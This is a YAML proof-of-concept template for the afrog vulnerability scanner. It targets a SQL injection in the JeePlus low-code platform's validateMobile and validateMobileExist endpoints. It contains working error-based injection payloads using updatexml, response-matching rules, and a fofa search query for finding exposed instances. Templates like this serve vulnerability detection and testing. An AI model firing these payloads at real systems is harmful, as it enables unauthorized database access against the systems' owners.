id: jeeplus-sys-user-validate-sqli

info:
  name: JeePlus低代码开发平台SQL注入
  author: zan8in
  severity: high
  verified: true
  description: |-
    JeePlus低代码开发平台SQL注入
    fofa: app="JeePlus"
  reference:
    - https://github.com/zan8in/afrog-pocs/tree/main/pocs
  tags: jeeplus,sqli
  created: 2024/02/28

set:
  randInt: randomInt(1000000000, 9999999999)
rules:
  r0:
    request:
      method: GET
      path: /a/sys/user/validateMobile?&mobile=1%27+and+1%3D%28updatexml%281%2Cconcat%280x7e%2C%28select+md5%28{{randInt}}%29%29%2C0x7e%29%2C1%29%29+and+%271%27%3D%271
    expression: response.body.bcontains(b'XPATH syntax error:') && response.body.bcontains(bytes(substr(md5(string(randInt)),0,31)))
  r1:
    request:
      method: GET
      path: /a/sys/user/validateMobileExist?&mobile=1%27+and+1%3D%28updatexml%281%2Cconcat%280x7e%2C%28select+md5%28{{randInt}}%29%29%2C0x7e%29%2C1%29%29+and+%271%27%3D%271
    expression: response.body.bcontains(b'XPATH syntax error:') && response.body.bcontains(bytes(substr(md5(string(randInt)),0,31)))
expression: r0() || r1()
